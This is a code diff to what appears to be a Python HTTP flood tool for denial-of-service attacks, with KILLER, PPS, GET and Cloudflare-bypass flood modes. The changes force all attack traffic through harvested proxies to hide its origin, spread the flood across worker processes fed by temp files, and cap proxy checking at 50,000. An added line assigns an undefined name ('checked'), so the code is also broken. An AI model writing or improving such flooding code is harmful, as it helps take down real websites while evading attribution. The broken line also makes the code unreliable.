@@ -3,7 +3,7 @@
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
-from json import load
+from json import load, dumps as _jdump, loads as _jload
 from logging import basicConfig, getLogger, shutdown
 from math import log2, trunc
 from multiprocessing import RawValue, Process, cpu_count
@@ -48,14 +48,8 @@ logger.setLevel("INFO")
 ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
-# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
 if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
     ctx.minimum_version = ssl.TLSVersion.TLSv1_2
-# Disable insecure TLS versions for additional safety
-if hasattr(ssl, "OP_NO_TLSv1"):
-    ctx.options |= ssl.OP_NO_TLSv1
-if hasattr(ssl, "OP_NO_TLSv1_1"):
-    ctx.options |= ssl.OP_NO_TLSv1_1
 
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
@@ -104,6 +98,34 @@ with open(__dir__ / "config.json") as f:
 with socket(AF_INET, SOCK_DGRAM) as s:
     s.connect(("8.8.8.8", 80))
     __ip__ = s.getsockname()[0]
+
+
+def _write_share_data(proxy_data, ua_data, ref_data=None, fp_data=None):
+    from tempfile import NamedTemporaryFile
+    from os import unlink
+    data = {"proxies": proxy_data, "uas": ua_data}
+    if ref_data:
+        data["refs"] = ref_data
+    if fp_data:
+        data["fps"] = fp_data
+    f = NamedTemporaryFile(mode="w", suffix=".json", delete=False, dir=str(__dir__ / "files"))
+    f.write(_jdump(data))
+    f.close()
+    return f.name
+
+
+def _read_share_data(path):
+    from os import unlink
+    try:
+        with open(path, "r") as f:
+            data = _jload(f.read())
+        try:
+            unlink(path)
+        except OSError:
+            pass
+        return data["proxies"], data["uas"], data.get("refs", []), data.get("fps", [])
+    except Exception:
+        return [], [], [], []
 
 
 class bcolors:
@@ -973,6 +995,8 @@ class HttpFlood(Thread):
         if self._proxies:
             sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
         else:
+            if getattr(self, '_enforce_proxy', False):
+                raise ConnectionError("No proxies available - all connections must go through proxy")
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
@@ -1116,6 +1140,8 @@ class HttpFlood(Thread):
         raw_target = self._raw_target
         is_https = self._target.scheme.lower() == "https"
 
+        share_path = _write_share_data(proxy_data, ua_data)
+
         procs = []
         for _ in range(num_processes):
             p = Process(
@@ -1123,7 +1149,7 @@ class HttpFlood(Thread):
                 args=(workers_per_process, rpc_per_process,
                       target_host, target_port, target_scheme,
                       target_authority, raw_target, is_https,
-                      proxy_data, ua_data),
+                      share_path),
                 daemon=True,
             )
             p.start()
@@ -1422,6 +1448,8 @@ class HttpFlood(Thread):
         raw_target = self._raw_target
         is_https = self._target.scheme.lower() == "https"
 
+        share_path = _write_share_data(proxy_data, ua_data, ref_data, fp_data)
+
         procs = []
         for _ in range(num_processes):
             p = Process(
@@ -1429,7 +1457,7 @@ class HttpFlood(Thread):
                 args=(workers_per_process, rpc_per_process,
                       target_host, target_port, target_scheme,
                       target_authority, raw_target, is_https,
-                      proxy_data, ua_data, ref_data, fp_data),
+                      share_path),
                 daemon=True,
             )
             p.start()
@@ -1868,6 +1896,8 @@ class HttpFlood(Thread):
         raw_target = self._raw_target
         is_https = self._target.scheme.lower() == "https"
 
+        share_path = _write_share_data(proxy_data, ua_data, ref_data)
+
         procs = []
         for _ in range(num_processes):
             p = Process(
@@ -1875,7 +1905,7 @@ class HttpFlood(Thread):
                 args=(workers_per_process, rpc_per_process,
                       target_host, target_port, target_scheme,
                       target_authority, raw_target, is_https,
-                      proxy_data, ua_data, ref_data),
+                      share_path),
                 daemon=True,
             )
             p.start()
@@ -1933,9 +1963,15 @@ class HttpFlood(Thread):
         except ImportError:
             HAS_CURL_CFFI = False
 
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
         if HAS_CURL_CFFI:
             s = _curl_session()
             if s is not None:
+                if pro:
+                    s.proxies = {"https": pro.addr, "http": pro.addr}
                 try:
                     for _ in range(self._rpc):
                         resp = s.get(self._target.human_repr(), timeout=9,
@@ -1950,20 +1986,14 @@ class HttpFlood(Thread):
                     pass
                 return
 
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
+        if not pro:
+            logger.warning("CFB: no proxy available, skipping direct connection")
+            return
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
+                with s.get(self._target.human_repr(),
+                           proxies=pro.asRequest()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
@@ -2047,9 +2077,15 @@ class HttpFlood(Thread):
         except ImportError:
             HAS_CURL_CFFI = False
 
+        pro = None
+        if self._proxies:
+            pro = randchoice(self._proxies)
+
         if HAS_CURL_CFFI:
             s = _curl_session()
             if s is not None:
+                if pro:
+                    s.proxies = {"https": pro.addr, "http": pro.addr}
                 try:
                     for _ in range(self._rpc):
                         resp = s.get(self._target.human_repr(), timeout=9,
@@ -2064,20 +2100,14 @@ class HttpFlood(Thread):
                     pass
                 return
 
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
+        if not pro:
+            logger.warning("BYPASS: no proxy available, skipping direct connection")
+            return
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
+                with s.get(self._target.human_repr(),
+                           proxies=pro.asRequest()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
@@ -2428,7 +2458,7 @@ def _killer_build_request_standalone(method, path, fp, target_authority,
 def _killer_process_entry(max_workers, rpc,
                           target_host, target_port, target_scheme,
                           target_authority, raw_target, is_https,
-                          proxy_data, useragents, referers, fingerprints):
+                          share_path):
     from random import uniform, randint, choice as rc
     from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
     from socket import TCP_NODELAY, IPPROTO_TCP
@@ -2437,6 +2467,8 @@ def _killer_process_entry(max_workers, rpc,
     import ssl as _ssl
     from PyRoxy import Proxy, ProxyType, Tools as PT
     from PyRoxy import Tools as ProxyTools
+
+    proxy_data, useragents, referers, fingerprints = _read_share_data(share_path)
 
     try:
         from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
@@ -2461,13 +2493,16 @@ def _killer_process_entry(max_workers, rpc,
         if is_https and HAS_CURL_CFFI:
             try:
                 from files.tls_client import create_session as _mk_session
-                return _mk_session()
+                s = _mk_session()
+                if proxy_objects:
+                    p = rc(proxy_objects)
+                    s.proxies = {"https": p.addr, "http": p.addr}
+                return s
             except Exception:
                 pass
-        if proxy_objects:
-            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
+        if not proxy_objects:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
+        sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         try:
             sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
@@ -2722,7 +2757,7 @@ def _killer_process_entry(max_workers, rpc,
 def _pps_process_entry(max_workers, rpc,
                        target_host, target_port, target_scheme,
                        target_authority, raw_target, is_https,
-                       proxy_data, useragents):
+                       share_path):
     from random import uniform, randint, choice as rc
     from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
     from socket import TCP_NODELAY, IPPROTO_TCP
@@ -2730,6 +2765,8 @@ def _pps_process_entry(max_workers, rpc,
     from ssl import SSLContext, create_default_context, CERT_NONE
     import ssl as _ssl
     from PyRoxy import Proxy, ProxyType, Tools as PT
+
+    proxy_data, useragents, referers, fingerprints = _read_share_data(share_path)
 
     try:
         from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
@@ -2754,13 +2791,16 @@ def _pps_process_entry(max_workers, rpc,
         if is_https and HAS_CURL_CFFI:
             try:
                 from files.tls_client import create_session as _mk
-                return _mk()
+                s = _mk()
+                if proxy_objects:
+                    p = rc(proxy_objects)
+                    s.proxies = {"https": p.addr, "http": p.addr}
+                return s
             except Exception:
                 pass
-        if proxy_objects:
-            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
+        if not proxy_objects:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
+        sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         try:
             sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
@@ -2882,7 +2922,7 @@ def _pps_process_entry(max_workers, rpc,
 def _get_process_entry(max_workers, rpc,
                        target_host, target_port, target_scheme,
                        target_authority, raw_target, is_https,
-                       proxy_data, useragents, referers):
+                       share_path):
     from random import uniform, randint, choice as rc
     from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
     from socket import TCP_NODELAY, IPPROTO_TCP
@@ -2890,6 +2930,8 @@ def _get_process_entry(max_workers, rpc,
     from ssl import SSLContext, create_default_context, CERT_NONE
     import ssl as _ssl
     from PyRoxy import Proxy, ProxyType, Tools as PT
+
+    proxy_data, useragents, referers, fingerprints = _read_share_data(share_path)
 
     try:
         from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
@@ -2914,13 +2956,16 @@ def _get_process_entry(max_workers, rpc,
         if is_https and HAS_CURL_CFFI:
             try:
                 from files.tls_client import create_session as _mk
-                return _mk()
+                s = _mk()
+                if proxy_objects:
+                    p = rc(proxy_objects)
+                    s.proxies = {"https": p.addr, "http": p.addr}
+                return s
             except Exception:
                 pass
-        if proxy_objects:
-            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
+        if not proxy_objects:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
+        sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         try:
             sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
@@ -3354,10 +3399,17 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     logger.info(
         f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies downloaded, checking...{bcolors.RESET}!")
+    if len(Proxies) > 50000:
+        from random import sample
+        Proxies = set(sample(list(Proxies), 50000))
+        logger.info(
+            f"{bcolors.WARNING}Capped to {bcolors.OKBLUE}50,000{bcolors.WARNING} random proxies for faster checking{bcolors.RESET}")
+    check_threads = min(max(threads, 500), len(Proxies))
     Proxies = ProxyChecker.checkAll(
-        Proxies, timeout=5, threads=threads,
+        Proxies, timeout=5, threads=check_threads,
         url=url.human_repr() if url else "http://httpbin.org/get",
     )
+    Proxies = checked
 
     if not Proxies:
         logger.warning(f"{bcolors.WARNING}All proxies failed check, falling back to file{bcolors.RESET}")
@@ -3459,8 +3511,49 @@ if __name__ == '__main__':
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 if method in {"KILLER", "PPS", "GET"}:
-                    HttpFlood(0, url, host, method, rpc, event,
-                              uagents, referers, proxies).start()
+                    target_host = url.host
+                    target_port = url.port or (443 if url.scheme == "https" else 80)
+                    target_scheme = url.scheme
+                    target_authority = url.authority
+                    raw_target = (host, url.port or 80)
+                    is_https = url.scheme.lower() == "https"
+                    proxy_data = []
+                    if proxies:
+                        for p in proxies:
+                            try:
+                                proxy_data.append((p.type.value, p.host, p.port, p.username or "", p.password or ""))
+                            except Exception:
+                                pass
+                    fp_data = list(HttpFlood._KILLER_FINGERPRINTS) if method == "KILLER" else []
+
+                    num_processes = max(1, min(cpu_count(), 8))
+                    rpc_per_process = max(rpc // num_processes, 1)
+                    workers_per_process = min(rpc_per_process * 8, 200)
+                    ua_data = list(uagents)
+                    ref_data = list(referers)
+
+                    share_path = _write_share_data(
+                        proxy_data, ua_data,
+                        ref_data if method in {"GET", "KILLER"} else None,
+                        fp_data if method == "KILLER" else None,
+                    )
+
+                    entry_map = {
+                        "KILLER": _killer_process_entry,
+                        "PPS": _pps_process_entry,
+                        "GET": _get_process_entry,
+                    }
+                    entry_fn = entry_map[method]
+
+                    procs = []
+                    for _ in range(num_processes):
+                        args = (workers_per_process, rpc_per_process,
+                                target_host, target_port, target_scheme,
+                                target_authority, raw_target, is_https,
+                                share_path)
+                        p = Process(target=entry_fn, args=args, daemon=True)
+                        p.start()
+                        procs.append(p)
                 else:
                     for thread_id in range(threads):
                         HttpFlood(thread_id, url, host, method, rpc, event,
@@ -3561,6 +3654,12 @@ if __name__ == '__main__':
                 sleep(1)
 
             event.clear()
+            if method in {"KILLER", "PPS", "GET"}:
+                for p in procs:
+                    try:
+                        p.terminate()
+                    except Exception:
+                        pass
             exit()
 
         ToolsConsole.usage()
